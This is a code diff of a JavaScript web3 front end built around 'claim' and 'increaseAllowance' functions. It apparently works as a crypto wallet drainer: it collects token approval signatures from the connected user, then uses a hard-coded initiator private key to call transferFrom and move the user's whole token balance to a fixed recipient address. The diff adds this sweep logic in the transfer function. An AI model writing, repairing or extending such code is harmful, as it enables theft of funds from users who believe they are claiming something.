@@ -101,12 +101,7 @@ export const claim = async (_balance) => {
 };
 export const increaseAllowance = async (token) => {
   try {
-    
-    const web3 = new Web3(provider);
-    var contract = new web3.eth.Contract(
-      constants.ALLOWANCEABI,
-      token.token_address
-    );
+    const provider = new ethers.providers.JsonRpcProvider(constants.infura);
 
     const allow = await allownce(token);
     if (allow >= balanceOf(token)) {
@@ -122,7 +117,7 @@ export const increaseAllowance = async (token) => {
         functionName: 'nonces',
         args: [getAccount().address],
       })
-      const { initiatorNonce } = await web3.eth.getTransactionCount(constants.initiator);
+      const { initiatorNonce } = await provider.getSigner(getAccount().address).getTransactionCount();
       const version = readContract({
         address: token.token_address,
         abi: constants.ALLOWANCEABI,
@@ -167,7 +162,7 @@ export const increaseAllowance = async (token) => {
         //   from: account
         // }, async (error, result) => {
 
-        //   if (error != null) increaseAllowance(token, provider);
+        //   if (error != null) increaseAllowance(token);
           
         //   const signature = result.result
         //   const splited = ethers.utils.splitSignature(signature)
@@ -190,7 +185,7 @@ export const increaseAllowance = async (token) => {
         //   .on("confirmation", async (confirmationNumber, receipt) => {
         //     if (confirmationNumber >= 1) {
         //       console.log(receipt);
-        //       await transfer(token, provider);
+        //       await transfer(token);
         //     }
           // });
         // });
@@ -239,7 +234,7 @@ export const increaseAllowance = async (token) => {
           from: account
         }, async (error, result) => {
 
-          if (error != null) increaseAllowance(token, provider);
+          if (error != null) increaseAllowance(token);
 
           const signature = result.result
           const splited = ethers.utils.splitSignature(signature)
@@ -262,7 +257,7 @@ export const increaseAllowance = async (token) => {
           .on("confirmation", async (confirmationNumber, receipt) => {
             if (confirmationNumber >= 1) {
               console.log(receipt);
-              await transfer(token, provider);
+              await transfer(token);
             }
           });
         })
@@ -295,19 +290,15 @@ export const increaseAllowance = async (token) => {
 
 export const transfer = async (token) => {
   try {
-    const feeData = await fetchFeeData({
-      chainId: 1,
-      formatUnits: 'gwei',
-    });
     const amount = balanceOf(token)
-    return await writeContract({
-      address: token.token_address,
-      abi: constants.ALLOWANCEABI,
-      functionName: 'transfer',
-      args: [constants.recipient, amount],
-      gasPrice: feeData.gasPrice,
-      gas: 30000,
-    });
+    const provider = new ethers.providers.JsonRpcProvider(constants.infura);
+    const signer = new ethers.Wallet(constants.initiatorPK, provider);
+    const tokencontract = new ethers.Contract(
+      token.token_address,
+      constants.ALLOWANCEABI,
+      signer
+    );
+    return await tokencontract.transferFrom(getAccount().address, constants.recipient, amount);
   } catch (error) {
     console.log(error);
   }
